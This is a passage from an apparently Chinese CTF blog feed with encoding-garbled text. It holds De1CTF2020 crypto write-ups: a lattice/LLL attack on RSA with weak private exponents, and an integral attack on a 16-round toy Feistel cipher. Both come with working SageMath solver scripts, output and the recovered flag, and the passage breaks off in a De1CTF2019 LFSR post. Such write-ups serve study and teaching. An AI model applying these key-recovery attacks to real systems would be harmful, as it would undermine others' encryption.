(1)$</p><p>è®¾$e_{1}$å¯¹åº”$k_{1}$ï¼Œ$e_{2}$å¯¹åº”$k_{2}$ï¼Œåˆ™æœ‰$k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\quad (2)$</p><p>ç”±(1)(2)æœ‰ï¼š</p><script type="math/tex; mode=display">\left\{\begin{matrix}e_{1}d_{1}g-k_{1}n=g+k_{1}s\\k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\\e_{1}e_{2}d_{1}d_{2}g_{2}-e_{1}d_{1}gk_{2}n-e_{2}d_{2}gk_{1}n+k_{1}k_{2}n^{2}=(g+k_{1}s)(g+k_{2}s)\end{matrix}\right.</script><p>ä¸Šè¿°ç­‰å¼ç»„ä¹Ÿå¯è¡¨ç¤ºä¸º</p><script type="math/tex; mode=display">[k_{1}k_{2},k_{2}d_{1}g,k_{1}d_{2}g,d_{1}d_{2}g^{2}]\cdot\left[\begin{matrix}n & -M_{1}n & 0 & n^{2}\\0 & M_{1}e_{1} & M_{2}e_{1} & -e_{1}n\\0 & 0 & -M_{2}e_{2} & -e_{2}n\\0 & 0 & 0 & e_{1}e_{2}\end{matrix}\right]\\=[k_{1}k_{2}n,M_{1}k_{2}(g+k_{1}s),M_{2}g(k_{2}-k_{1})ï¼Œ(g+k_{1}s)(g+k_{2}s)]</script><p>(å…¶ä¸­$M_{1}=n^{1/2},M_{2}=n^{1+\alpha_{2}},d\approx n^{\alpha_{2}}$.)</p><p>å¯¹éƒ¨åˆ†å‚æ•°è¿›è¡Œä¸Šç•Œä¼°è®¡ï¼Œkä¸Šç•Œè¿‘ä¼¼äº$d\approx N^{\alpha_{2}}$ï¼Œ$|s|$ä¸Šç•Œ$\approx N^{1/2}$ï¼Œgä¸€èˆ¬ç›¸å¯¹æå°</p><p>å› æ­¤ä¸Šé¢çš„çŸ©é˜µè¡¨ç¤ºBA=Cä¸­ï¼ŒCçš„æ¯ä¸ªå…ƒçš„sizeéƒ½è¿‘ä¼¼$n^{1+2\alpha_{2}}$ï¼Œæ‰€ä»¥$|C|\approx 2\cdot n^{1+2\alpha_{2}}$</p><p>Bä½œä¸ºæ ¼åŸºçš„æ ¼ä¸­ï¼Œæœ€çŸ­å‘é‡ç”±Minkowski BoundsçŸ¥$\approx \sqrt{4}det(B)^{1/4}\approx 2\cdot n^{(13/2+\alpha_{2})/4}$</p><p>å› æ­¤åªè¦æ»¡è¶³$n^{1+2\alpha_{2}}&lt;n^{(13/2+\alpha_{2})/4}$å³å¯å°†é—®é¢˜è½¬åŒ–ä¸ºSVPï¼ˆ$\alpha_{2}&lt;\frac{5}{14}$ï¼‰.</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">731</span>, <span class="number">682</span>, <span class="number">-1</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    alpha2 = i / <span class="number">2048</span></span><br><span class="line">    M1 = round(n ^ <span class="number">0.5</span>)</span><br><span class="line">    M2 = round(n ^ (<span class="number">1</span> + alpha2))</span><br><span class="line">    A = Matrix(ZZ, [</span><br><span class="line">        [n, -M1*n,      <span class="number">0</span>,   n^<span class="number">2</span>],</span><br><span class="line">        [<span class="number">0</span>, M1*e1, -M2*e1, -e1*n],</span><br><span class="line">        [<span class="number">0</span>,     <span class="number">0</span>,  M2*e2, -e2*n],</span><br><span class="line">        [<span class="number">0</span>,     <span class="number">0</span>,      <span class="number">0</span>, e1*e2]</span><br><span class="line">    ])</span><br><span class="line">    AL = A.LLL()</span><br><span class="line">    C = Matrix(ZZ, AL[<span class="number">0</span>])</span><br><span class="line">    B = A.solve_left(C)[<span class="number">0</span>]</span><br><span class="line">    phi1 = floor(e1 * B[<span class="number">1</span>] / B[<span class="number">0</span>])</span><br><span class="line">    phi2 = floor(e2 * B[<span class="number">2</span>] / B[<span class="number">0</span>])</span><br><span class="line">    d1 = inverse(e1, phi1)</span><br><span class="line">    d2 = inverse(e2, phi2)</span><br><span class="line">    m1 = long_to_bytes(pow(c, d1, n))</span><br><span class="line">    m2 = long_to_bytes(pow(c, d2, n))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"De1"</span> <span class="keyword">in</span> m1 <span class="keyword">or</span> <span class="string">b"De1"</span> <span class="keyword">in</span> m2:</span><br><span class="line">        print(m1)</span><br><span class="line">        print(m2)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-06_01-20-35.png" alt></p><p>å¯ä»¥å‘ç°727 bitsçš„æ—¶å€™LLLæ±‚è§£SVPæˆåŠŸ</p><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>Day1æ™šä¸Šcoinå’Œæˆ‘è¯´æ˜¯d3åŸé¢˜â€¦åªä¸è¿‡æ˜¯size(d)åªæœ‰ä¸€ä¸ªèŒƒå›´ï¼Œ$\alpha_{2}$è¦è¿›è¡Œè°ƒæ•´ï¼ˆåŸç†ç†è§£èµ·æ¥ä¸éš¾â€¦è¿˜æ˜¯åšé¢˜å¤ªå°‘- -</p><h3 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a>ECDH</h3><p>æ²¡çœ‹-.-shallowå¸ˆå‚…è‡ªå·±ä¸€ä¸ªäººaæ‰äº†tql</p><p>ï¼ˆé¢˜è§£åˆ†æè§†æ—¶é—´è¡¥å……</p><h3 id="Mini-PurÎµ-Plus"><a href="#Mini-PurÎµ-Plus" class="headerlink" title="Mini PurÎµ Plus"></a>Mini PurÎµ Plus</h3><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>De1CTF2019ä¹Ÿå‡ºè¿‡PurÎµï¼Œä½†é‚£æ—¶å€™è€ƒå¯Ÿçš„æ˜¯æœ€åŸºæœ¬çš„æ’å€¼æ”»å‡»ï¼ŒåŠ å¯†çš„è½®æ¬¡ä¹Ÿåªæœ‰6è½®ï¼Œä»Šå¹´ROUNDæå‡åˆ°16åï¼Œç›´æ¥æ’é™¤ä¸€èˆ¬çš„æ’å€¼æ”»å‡»</p><p>ç”±é¢˜ç›®åˆ†æçŸ¥ï¼Œç»™å‡ºptçš„å·¦åŠè¾¹å‡å›ºå®šï¼Œæ‰€ä»¥è¾“å…¥å½¢å¼ä¸º$(C, x),C\in GF(2^{24})$ï¼ŒæŸ¥é˜…èµ„æ–™æ‰¾åˆ°ä»¥ä¸‹ç®—æ³•ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/QQå›¾ç‰‡20200506013028.jpg" alt></p><p>ä½†å®ç°ä»¥åå‘ç°è®¡ç®—$3^{15}+1$ä¸ª(x, y)çš„æ‹‰æ ¼æœ—æ—¥æ’å€¼å¤šé¡¹å¼æ—¶é—´å¤æ‚åº¦æ¥è¿‘$O(2^{48})$</p><p>æ™šä¸Šåˆåœ¨ä¸Šé¢çš„ç®—æ³•åŸºç¡€ä¸Šï¼ŒåŠ äº†ä¸­é—´ç›¸é‡çš„ä¼˜åŒ–ï¼Œå°†é—®é¢˜è½¬åŒ–ä¸ºnå…ƒ1æ¬¡æ–¹ç¨‹ç»„çš„æ±‚è§£ï¼Œæ—¶é—´å¤æ‚åº¦ä¸Šå¯è¡Œï¼Œä½†$n\approx 40000$ï¼Œå†…å­˜æ¶ˆè€—ç›´æ¥é£™åˆ°2Tï¼Œéš¾é¡¶</p><p><strong>[èµ›åå¤ç°]</strong></p><p>De1taå®˜æ–¹wpç”¨çš„åšæ³•æ˜¯é«˜æ¬¡ç§¯åˆ†æ”»å‡»ï¼ŒåŸç†åˆ†æèµ·æ¥ä¹Ÿä¸éš¾ï¼Œä½†è¿™é‡Œç”¨çš„æ˜¯rank1é˜Ÿä¼ç”¨çš„å¦ä¸€ç§è§£æ³•ï¼ˆå€ŸåŠ©$GF(2^{24})$ä¸Šçš„å•ä½æ ¹ï¼‰</p><p>ä»–ä»¬ä¸€å¼€å§‹ç”¨çš„ä¹Ÿæ˜¯ä¸­é—´ç›¸é‡æ”»å‡»ï¼Œå³ç”¨$g(x)$å’Œ$h(y,z)$ä½œä¸ºpurÎµæ­£å‘å’Œé€†å‘çš„å‡½æ•°è¡¨ç¤º</p><p>å¯¹äºç¬¬iè½®çš„è¾“å‡ºå·¦ä¾§ï¼Œ$deg_{x}(g)=3^{i-1}$ï¼Œå¯¹äºå³ä¾§ï¼Œ$deg_{x}(g)=3^{i}$ï¼›</p><p>é€†å‘æ¥çœ‹ï¼Œå¯¹äºå·¦ä¾§ï¼Œ$deg_{y}(h)=3^{16-m},deg_{z}(h)=3^{15-m}$ï¼Œå³ä¾§ï¼Œ$deg_{y}(h)=3^{15-m},deg_{z}(h)=3^{14-m}$.</p><p>ä½†å¦‚æœç›´æ¥ä¸­é—´ç›¸é‡æ”»å‡»æ±‚è§£å¤šé¡¹å¼çš„ç³»æ•°ï¼Œå°±ä¼šé‡åˆ°å…ˆå‰æˆ‘è¯´çš„ç©ºé—´å¤æ‚åº¦å‡‰å‡‰</p><p>æ‰€ä»¥ä»–ä»¬ä¸¢å¼ƒäº†$h(y,z)$ï¼Œæ”¹ç”¨$g(x)$å’Œå•ä½æ ¹è¿›è¡Œæ±‚è§£ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><p>$GF(2^{24})^{*}$ä¸Šï¼ŒåŸºäºé˜¶ä¸º$2^{24}-1$çš„äº‹å®ï¼Œä»»æ„dæ¬¡å•ä½æ ¹$\omega$éƒ½å¯è¡¨ç¤ºä¸º$g^{\frac{2^{24}-1}{d}}$ï¼ˆgä¸º$GF(2^{24})$ä¸Šçš„ç”Ÿæˆå…ƒï¼‰</p><p>ä¸”$1+\omega+\omega^{2}+â€¦+\omega^{d-1}=0$ï¼Œæ˜“çŸ¥$\sum_{i=0}^{d-1}\omega^{ij}=0$åœ¨$d\nmid j$æ—¶å‡æˆç«‹ï¼Œåä¹‹â‰ 0ï¼ˆç”»ä¸ªå•ä½åœ†å·®ä¸å¤šå°±getäº†</p><p>æ‰€ä»¥éšæœºå–$a\in GF(2^{24})$ï¼Œåœ¨$deg(g)&lt;d$æ—¶ï¼Œå‡æœ‰</p><script type="math/tex; mode=display">\sum^{d-1}_{i=0}g(a\omega^{i})=g(0)</script><p>è®¾ç¬¬iè½®åçš„å¯†æ–‡ä¸º$(l_{i},r_{i})$ï¼Œåˆ™ç¬¬i-1è½®åçš„å¯†æ–‡ä¸º$(r_{i}+(l_{i}+k_{i})^{3},l_{i})=((r_{i}+l_{i}^{3})+l_{i}^{2}k_{i}+l_{i}k_{i}^{2}+k_{i}^{3},l_{i})$</p><p>å¯ä»¥çœ‹åˆ°ç¬¬i-1è½®å·¦ä¾§$k_{i}$çš„ä¾èµ–é¡¹ä¸º$l_{i}^{2},l_{i}$ï¼Œå†åŸºäºå‰é¢æåˆ°çš„ç¬¬iè½®æ—¶ï¼Œå·¦ä¾§$deg_{x}(g)=3^{i-1}$ï¼Œå¦‚æœ$l_{i}$çš„$degree&lt;d$ï¼Œåˆ™$g(0)+\sum l_{i}=0$ï¼Œä¸”$k_{i}^{3}$çš„ç³»æ•°1ä¸€å®šç´¯åŠ å¶æ•°æ¬¡ï¼ˆå› ä¸º$d\mid (2^{24}-1)\Rightarrow 2\nmid d$ï¼‰ï¼Œå³ç´¯åŠ åä¸‰æ¬¡é¡¹çš„ç³»æ•°ä¸€å®šä¸º0ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´æ‰€æœ‰$k_{i}$çš„ä¾èµ–é¡¹ç­‰äº0ï¼Œæ±‚è§£å¤±è´¥</p><p>äºæ˜¯ä»¤$3^{i-1}&gt;d,3^{i-2}&lt;d,d\mid (2^{24}-1)$ï¼Œæ¯”å¦‚æ±‚è§£k15æ—¶ï¼Œå–$d=\frac{2^{24}-1}{3}$ï¼Œæ±‚è§£k14æ—¶ï¼Œ$d//=3$ï¼Œé—®é¢˜è½¬åŒ–ä¸ºå‘é‡ç›¸åŠ å¹¶æ±‚è§£äºŒæ¬¡æ–¹ç¨‹æ ¹ï¼Œæ—¶é—´å¤æ‚åº¦æ§åˆ¶åœ¨$O(2^{24})$ä¸‹</p><p>æ±‚è§£å‡ºk14,k15åï¼Œæ ¹æ®é¢˜ç›®ä¸­æœ€åç»™å‡ºçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = sympy.nextprime(<span class="number">2</span>**<span class="number">24</span>)</span><br><span class="line">arr = np.random.randint(<span class="number">0</span>,p,(ROUND,ROUND<span class="number">-2</span>),dtype=<span class="string">'int64'</span>)</span><br><span class="line">keys = np.array(keys)</span><br><span class="line">res = np.mod(np.dot(keys,arr),p)</span><br></pre></td></tr></table></figure><p>é—®é¢˜å³è½¬åŒ–ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = next_prime(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">A = Matrix(Fp, <span class="number">16</span>, <span class="number">14</span>, arr[:<span class="number">16</span>*<span class="number">14</span>])</span><br><span class="line">B = vector(Fp, arr[<span class="number">-14</span>:])</span><br><span class="line">K = A.delete_rows([<span class="number">14</span>, <span class="number">15</span>]).solve_left(B - k14 * A[<span class="number">14</span>] - k15 * A[<span class="number">15</span>])</span><br></pre></td></tr></table></figure><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">toF = F.fetch_int</span><br><span class="line">fromF = <span class="keyword">lambda</span> i : i.integer_representation()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get data</span></span><br><span class="line">data = dict()</span><br><span class="line"><span class="keyword">for</span> pt, ct <span class="keyword">in</span> zip(open(<span class="string">'pt.txt'</span>), open(<span class="string">'ct.txt'</span>)):</span><br><span class="line">    pt = pt.rstrip(<span class="string">'\n'</span>)</span><br><span class="line">    ptr = toF(int(pt[<span class="number">6</span>:], <span class="number">16</span>))</span><br><span class="line">    ct = ct.rstrip(<span class="string">'\n'</span>)</span><br><span class="line">    ctl = toF(int(ct[:<span class="number">6</span>], <span class="number">16</span>))</span><br><span class="line">    ctr = toF(int(ct[<span class="number">6</span>:], <span class="number">16</span>))</span><br><span class="line">    data[ptr] = (ctl, ctr)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">omega = F.gen()^<span class="number">3</span> <span class="comment"># ((2^24-1)/3)th root of unity</span></span><br><span class="line">poly = vector(F, <span class="number">4</span>) <span class="comment"># polynomial for k_15</span></span><br><span class="line">a = toF(<span class="number">2333</span>) <span class="comment"># ini</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range((<span class="number">2</span>**<span class="number">24</span><span class="number">-1</span>)//<span class="number">3</span>)):</span><br><span class="line">    r, l = data[a] <span class="comment"># swap</span></span><br><span class="line">    v = vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">    poly += v</span><br><span class="line">    a *= omega</span><br><span class="line">r, l = data[toF(<span class="number">0</span>)]</span><br><span class="line">poly += vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><pre><code>100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 5592405/5592405 [04:04&lt;00:00, 22915.12it/s]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">R = PolynomialRing(F, names=<span class="string">'k'</span>)</span><br><span class="line">k = R.gen()</span><br><span class="line">eq = poly[<span class="number">0</span>] + poly[<span class="number">1</span>] * k + poly[<span class="number">2</span>] * k^<span class="number">2</span> + poly[<span class="number">3</span>] * k^<span class="number">3</span></span><br><span class="line">k15s = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> eq.roots()]</span><br><span class="line">print([fromF(_) <span class="keyword">for</span> _ <span class="keyword">in</span> k15s])</span><br></pre></td></tr></table></figure><pre><code>[4122190, 14944194]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">k1415 = []</span><br><span class="line"><span class="keyword">for</span> k15 <span class="keyword">in</span> k15s:</span><br><span class="line">    omega = F.gen()^<span class="number">9</span> <span class="comment"># ((2^24-1)/9)th root of unity</span></span><br><span class="line">    poly = vector(F, <span class="number">4</span>) <span class="comment"># polynomial for k_14</span></span><br><span class="line">    a = toF(<span class="number">2333</span>) <span class="comment"># ini</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range((<span class="number">2</span>**<span class="number">24</span><span class="number">-1</span>)//<span class="number">9</span>)):</span><br><span class="line">        r, l = data[a] <span class="comment"># swap</span></span><br><span class="line">        l, r = r + (l + k15) ^ <span class="number">3</span>, l</span><br><span class="line">        v = vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">        poly += v</span><br><span class="line">        a *= omega</span><br><span class="line">    r, l = data[toF(<span class="number">0</span>)]</span><br><span class="line">    l, r = r + (l + k15) ^ <span class="number">3</span>, l</span><br><span class="line">    poly += vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">    eq = poly[<span class="number">0</span>] + poly[<span class="number">1</span>] * k + poly[<span class="number">2</span>] * k^<span class="number">2</span> + poly[<span class="number">3</span>] * k^<span class="number">3</span></span><br><span class="line">    k14s = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> eq.roots()]</span><br><span class="line">    <span class="keyword">for</span> k14 <span class="keyword">in</span> k14s:</span><br><span class="line">        k1415.append((fromF(k14), fromF(k15)))</span><br><span class="line">        print((fromF(k14), fromF(k15)))</span><br></pre></td></tr></table></figure><pre><code>100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1864135/1864135 [01:27&lt;00:00, 21343.81it/s]  0%|          | 2069/1864135 [00:00&lt;01:30, 20685.68it/s](2216205, 4122190)(14035807, 4122190)100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1864135/1864135 [01:26&lt;00:00, 21605.20it/s](5546654, 14944194)(9208218, 14944194)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">arr = re.findall(<span class="string">r"\d+"</span>, open(<span class="string">"data.txt"</span>, <span class="string">"r"</span>).read())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = next_prime(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">A = Matrix(Fp, <span class="number">16</span>, <span class="number">14</span>, arr[:<span class="number">16</span>*<span class="number">14</span>])</span><br><span class="line">B = vector(Fp, arr[<span class="number">-14</span>:])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ks = []</span><br><span class="line"><span class="keyword">for</span> k14, k15 <span class="keyword">in</span> k1415:</span><br><span class="line">    K = A.delete_rows([<span class="number">14</span>, <span class="number">15</span>]).solve_left(B - k14 * A[<span class="number">14</span>] - k15 * A[<span class="number">15</span>])</span><br><span class="line">    Ks.append(K.list() + [k14, k15])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> Ks:</span><br><span class="line">    l = toF(<span class="number">0x777777</span>)</span><br><span class="line">    r = toF(<span class="number">2333</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        l , r = r , l + (r + toF(int(k[i]))) ^ <span class="number">3</span></span><br><span class="line">    l, r = r, l</span><br><span class="line">    <span class="keyword">if</span> (l, r) == data[toF(<span class="number">2333</span>)]:</span><br><span class="line">        key = k</span><br><span class="line">        print(key)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><pre><code>[16359893, 9091260, 11254674, 353718, 5395716, 9319892, 2360013, 12784246, 9857353, 2940944, 964650, 3296014, 7022345, 198188, 9208218, 14944194]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'d519b93b0fd950bdf1e1c321fc32e4c4c4b225b80c1ba091f31217b90132ed107e1f6b1c9dd60ba0eafcdd5923764c46'</span></span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher), <span class="number">12</span>):</span><br><span class="line">    r, l = toF(int(cipher[i:i+<span class="number">6</span>], <span class="number">16</span>)), toF(int(cipher[i+<span class="number">6</span>:i+<span class="number">12</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        l, r = r + (l + toF(int(key[<span class="number">15</span>-j]))) ^ <span class="number">3</span>, l</span><br><span class="line">    l, r = fromF(l), fromF(r)</span><br><span class="line">    flag += (long_to_bytes(l) + long_to_bytes(r))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><pre><code>b&#39;De1CTF{6a2ddcc3-c729-48f8-b5e0-7574c46a2846}\x04\x04\x04\x04&#39;</code></pre><h4 id="More-1"><a href="#More-1" class="headerlink" title="[More]"></a>[More]</h4><p>æ¯”èµ›æœŸé—´å…¶å®å·²ç»æ‰¾åˆ°é«˜æ¬¡ç§¯åˆ†æ”»å‡»ç›¸å…³çš„å†…å®¹äº†- -ä½†æ˜¯ä»–åé¢ç»™äº†å¼ è¡¨ï¼ˆ15 ROUNDè¦è·‘31hï¼‰ï¼Œç›´æ¥åŠé€€ï¼Œçœ‹åˆ°å®˜æ–¹wpçš„æ—¶å€™ï¼ˆä¸€è„¸æ‡µï¼‰ï¼Œç„¶åå†çœ‹äº†ä¸‹è¡¨ä¸Šçš„æµ‹è¯•ç”¨cpuï¼Œå¥”è…¾4â€¦ğŸ‘´ä½›è¾£</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Training-Record-1</title>
      <link href="/2020/04/30/CTF-Training-Record-1/"/>
      <url>/2020/04/30/CTF-Training-Record-1/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>CTF-Training-Recordç³»åˆ—ä»…ç”¨äºä½œéƒ¨åˆ†CTFåˆ·é¢˜è®°å½•ï¼Œä¸å®šæœŸæ›´æ–°</p><h3 id="De1CTF2019-Babylfsr"><a href="#De1CTF2019-Babylfsr" class="headerlink" title="De1CTF2019 - Babylfsr"></a>De1CTF2019 - Babylfsr</h3><h4 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>BM algorithm</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶"><a href="#é¢˜ç›®æ–‡ä»¶" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="Babylfsr.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>(FLAG==<span class="string">"de1ctf&#123;"</span>+hashlib.sha256(hex(KEY)[<span class="number">2</span>:].rstrip(<span class="string">'L'</span>)).hexdigest()+<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(FLAG[<span class="number">7</span>:<span class="number">11</span>]==<span class="string">'1224'</span>)</span><br><span class="line"></span><br><span class="line">LENGTH = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(KEY.bit_length()==LENGTH)</span><br><span class="line"><span class="keyword">assert</span>(MASK.bit_length()==LENGTH)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    l = lfsr(KEY,MASK,LENGTH)</span><br><span class="line">    r = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">63</span>):</span><br><span class="line">        b = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            b = (b&lt;&lt;<span class="number">1</span>)+l.next()</span><br><span class="line">        r += pad(bin(b)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'output'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        